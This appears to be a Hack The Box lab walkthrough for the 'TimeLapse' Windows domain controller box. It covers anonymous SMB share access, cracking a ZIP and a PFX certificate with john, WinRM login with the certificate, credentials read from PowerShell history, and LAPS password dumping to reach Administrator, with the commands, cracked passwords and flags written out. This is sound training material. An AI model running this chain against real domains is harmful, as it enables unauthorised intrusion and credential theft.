---
title: "HTB - TimeLapse"
categories: [box]
date: 2020-07-30
comments: true
image: /images/walkthroughs/hackthebox/timelapse/logo.png
favicon: /images/walkthroughs/hackthebox/timelapse/logo.png
description: HTB - TimeLapse walkthrough
---

# TimeLapse

<p align="center">
  <img src="/images/walkthroughs/hackthebox/timelapse/banner.png" width="70%"/>
</p>


## Summary

TimeLapse is an easy box where no website is hosted. The foothold can be achieved by enumerating shares anonymously and discovering a pfx file which needs some password cracking, for the zip file that contains it and the certificate itself. Then we can log into the machine using that certificate with the user legacyy. For privesc, winpeas showed us the powershell command history file with the svc_admin user and the hardcoded password in the credential object declaration. Executing commands as svc_admin, we can check its AD privileges and we could see that is within the LAPS_Readers groups, so we can perform a query into the AD to retrieve the local accounts passwords, including the Administrator one, which allowed us to log into the machine as the Administrator user and retrieve the root flag.


## Enumeration

We start with the usual nmap:

```
kali@kali:~/Desktop/H$ nmap -sC -sV -p- 10.10.11.152 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 02:45 EDT
Nmap scan report for 10.10.11.152
Host is up (0.042s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-23 14:47:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_ssl-date: 2022-05-23T14:48:47+00:00; +7h59m59s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
59406/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-23T14:48:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.82 seconds
```

At first glimpse, we can see the DNS, LDAP, kerberos... The names for the domain controller (dc01.timelapse.htb) give us the clue for it to be a box with active directory.

Other tool I like to run in these cases is enum4linux, but there is no extra information:


```bash
enum4linux -a 10.10.11.152

administrator, guest, krbtgt, domain admins, root, bin, none
 ================================( Nbtstat Information for 10.10.11.152 )================================
                                                                                                                   
Looking up status of 10.10.11.152   
No reply from 10.10.11.152
 ===================================( Session Check on 10.10.11.152 )=================================== 
[+] Server 10.10.11.152 allows sessions using username '', password ''            
 ================================( Getting domain SID for 10.10.11.152 )================================
                                                                                                                                                                                                                  
Domain Name: TIMELAPSE                                                                                                                                                                                            
Domain Sid: S-1-5-21-671920749-559770252-3318990721

[+] Host is part of a domain (not a workgroup) 
```

Another enumeration tool for windows machines I like to use SMB and its ports (135,445). We try to login with no user (anonymous login) with smbclient and the quick enumeration with smbmap in case that tool provides us more information about the shares:


```bash
smbclient -L 10.10.11.152 -U ' ' 
  Enter WORKGROUP\ \'s password: 

          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
          NETLOGON        Disk      Logon server share 
          Shares          Disk      
          SYSVOL          Disk      Logon server share 

  Reconnecting with SMB1 for workgroup listing.
  do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
  Unable to connect with SMB1 -- no workgroup available

smbmap -H 10.10.11.152          
  [+] IP: 10.10.11.152:445        Name: timelapse.htb 
```

We can confirm the domain name for this machine, so we add _timelapse.htb,dc01.timelapse.htb_ and _dc01_ to the /etc/hosts file.

Following up with the enumeration, we saw the "Shares" share with no description, let's check how deep we can dig into it with the anonymous login. In this interaction, we saw a set of files related to LAPS and winrm_backup within two folders: HelpDesk and Dev. I retrieved them into my machine:

```bash
smbclient //10.10.11.152/Shares 
Enter WORKGROUP\kali\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 2464885 blocks available

smb: \HelpDesk\> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 2464325 blocks available
smb: \HelpDesk\> get LAPS_Datasheet.docx 
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (395.3 KiloBytes/sec) (average 395.3 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_OperationsGuide.docx 
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (715.8 KiloBytes/sec) (average 642.8 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx 
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (410.3 KiloBytes/sec) (average 612.0 KiloBytes/sec)
smb: \HelpDesk\> get LAPS.x64.msi 
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (1104.1 KiloBytes/sec) (average 824.1 KiloBytes/sec)
smb: \HelpDesk\> cd ..
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 2464325 blocks available
smb: \> cd Dev\
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 2464325 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (15.2 KiloBytes/sec) (average 768.9 KiloBytes/sec)
smb: \Dev\> 
```

The most valuable file could be winrm_backup.zip due to its name. The ZIP has a password, but listing its content, we can see a [PFX file](https://www.sslmarket.com/ssl/how-to-create-an-pfx-file#:~:text=A%20PFX%20file%20indicates%20a,need%20to%20deploy%20a%20certificate.) which probably contains an SSL certificate and its private key in PKCS#12 format. This can be used by the company for authentication into a machine or maybe we can execute a pass-the-certificate attack(?)


```bash
unzip winrm_backup.zip   
  Archive:  winrm_backup.zip
  [winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

Since it is protected, let's try to crack its password with john and rockyou.txt dictionary.

```bash
zip2john winrm_backup.zip > win.hash
john win.hash --wordlist=/usr/share/wordlists/rockyou.txt 

  Using default input encoding: UTF-8
  Loaded 1 password hash (PKZIP [32/64])
  Will run 4 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
  1g 0:00:00:00 DONE (2022-05-23 03:25) 2.777g/s 9648Kp/s 9648Kc/s 9648KC/s surkerior..superkebab
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.
```

We got the password **supremelegacy** for the ZIP file. Now unzip the file and check the information about its certificate:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -info                                       
  Enter Import Password:
  MAC: sha1, Iteration 2000
  MAC length: 20, salt length: 20
  Mac verify error: invalid password?
```

When trying to retrieve the information it ask us for a password, I reused the **supremelegacy** one and also tried with no password, but there was no luck so I tried to crack it again with our favourite  dictionary:


```bash
pfx2john legacyy_dev_auth.pfx > lega.hash
john lega.hash --wordlist=/usr/share/wordlists/rockyou.txt 

  Using default input encoding: UTF-8
  Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
  Cost 1 (iteration count) is 2000 for all loaded hashes
  Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
  Will run 4 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  thuglegacy       (legacyy_dev_auth.pfx)     
  1g 0:00:01:48 DONE (2022-05-23 03:37) 0.009187g/s 29687p/s 29687c/s 29687C/s thuglife06..thug211
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.
```

The obtained password is **thuglegacy** now we can retrieve the private key and the information:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/timelapse/1_0_pfx.png" width="70%"/>
</p>

Now, extract the private key. We could copy and paste the terminal output, but when dealing with certificates I recommend using in-built commands from OpenSSL to avoid whitespaces/end-of-line issues:

```bash
# Extract the private key with the nocerts option
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out timelapse.key -nodes 

# Extract the certificate with the nokeys option
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out timelapse.cert
```

With the certificate first thing to try is to use evil-winrm with the SSL option (since we are going to pass a certificate and port 5986 indicates the SSL connection):

```bash
evil-winrm -S -k timelapse.key -c timelapse.cert -i timelapse.htb
```

And we are in:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/timelapse/1_1_in.png" width="90%"/>
</p>

Let's grab the user flag:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/timelapse/1_2_user.png" width="70%"/>
</p>


``` 9bedd178180c56775518f324966305fd ```


## Privesc

Checking the basic permissions we see nothing special:

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Let's run Winpeas for an initial recon. You can upload the script with evil-winrm "upload" function. Remember to set the absolute path for both the source and the destination, if not you will find directory or privilege issues in the process. Also, you can use python3 -m http.server and curl combo to upload it.

While it's running, we can do some manual recon for the Active Directory privileges of the pwned user (legacyy):

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 12:17:10 PM
Password expires             Never
Password changeable          10/24/2021 12:17:10 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/23/2022 8:49:26 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.
```

Nothing interesting showed up. Checking the winpeas output, we can see some of the users in the machine and the powershell history file, which is always a must-check if it is available (also in linux boxes):

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   DC01
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   5/22/2022 11:17:36 PM
   Logons Count            :   23
   Password Last Set       :   5/22/2022 10:08:51 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 11:40:55 AM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   thecybergeek
   User Id                 :   1601
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:16:26 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   payl0ad
   User Id                 :   1602
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:16:44 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   legacyy
   User Id                 :   1603
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   5/23/2022 8:49:26 AM
   Logons Count            :   21
   Password Last Set       :   10/23/2021 12:17:10 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   sinfulz
   User Id                 :   1604
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:17:27 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   babywyrm
   User Id                 :   1605
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/23/2021 12:17:41 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   svc_deploy
   User Id                 :   3103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   5/23/2022 12:42:23 AM
   Logons Count            :   69
   Password Last Set       :   10/25/2021 12:12:37 PM

   =================================================================================================

   Computer Name           :   DC01
   User Name               :   TRX
   User Id                 :   5101
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :
   Last Logon              :   5/22/2022 10:09:05 PM
   Logons Count            :   45
   Password Last Set       :   2/23/2022 6:43:45 PM

   =================================================================================================

  ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/timelapse/2_0_ps_history.png" width="90%"/>
</p>


Checking the _ConsoleHost_history.txt_ file we can see the credential object with the hardcoded credentials:

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

The previous set of commands might look scary, but in broad tems, it is like a sudo in linux. We see the session options first, then set the credential object (user and password to run command as that user) and then Invoke-Command. Let's run some recon commands with that method. I fwe have any issues we can use evil-winrm with the password:

```bash
Invoke-Command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/timelapse/2_1_whoami_remote.png" width="90%"/>
</p>


```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user}

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\legacyy\Desktop> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/23/2022 9:43:05 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

Going over the previous commands, we can see that our user is not domain admin but it is within the LAPS_Readers group. LAPS stands for _Local Administrator Password Solution_ and if the group name is not a rabbit hole, we could be able to read the credentials of local accounts of domain-joined computers. A quick guide on this attack can be found in this [post](https://www.hackingarticles.in/credential-dumpinglaps/).

We can run the any of following commands:

```bash
# To get all the properties
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *

# To get only the passwords
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```

The final command will look like this:

```bash
Invoke-Command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
```

Run into the machine:

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}


PSComputerName              : localhost
RunspaceId                  : b9dd19c6-5542-49e6-bda7-37520733fd1a
DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : -wr8lMxvLm4H)4256zm18i5+
ms-Mcs-AdmPwdExpirationTime : 132981881311010063
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

PSComputerName    : localhost
RunspaceId        : b9dd19c6-5542-49e6-bda7-37520733fd1a
DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DB01
ObjectClass       : computer
ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
SamAccountName    : DB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1606
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : b9dd19c6-5542-49e6-bda7-37520733fd1a
DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : WEB01
ObjectClass       : computer
ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
SamAccountName    : WEB01$
SID               : S-1-5-21-671920749-559770252-3318990721-1607
UserPrincipalName :

PSComputerName    : localhost
RunspaceId        : b9dd19c6-5542-49e6-bda7-37520733fd1a
DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
DNSHostName       :
Enabled           : True
Name              : DEV01
ObjectClass       : computer
ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
SamAccountName    : DEV01$
SID               : S-1-5-21-671920749-559770252-3318990721-1608
UserPrincipalName :
```

And we can see the Administrator password in the attribute, so let's use it in WinRM and grab the root flag, which was in the user TXR Desktop's:

```bash
evil-winrm -u 'Administrator' -p '-wr8lMxvLm4H)4256zm18i5+' -i 10.10.11.152  -S
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/timelapse/3_0_root.png" width="70%"/>
</p>


``` 9633d77658e0e2d471b6db4bc3a345cc ```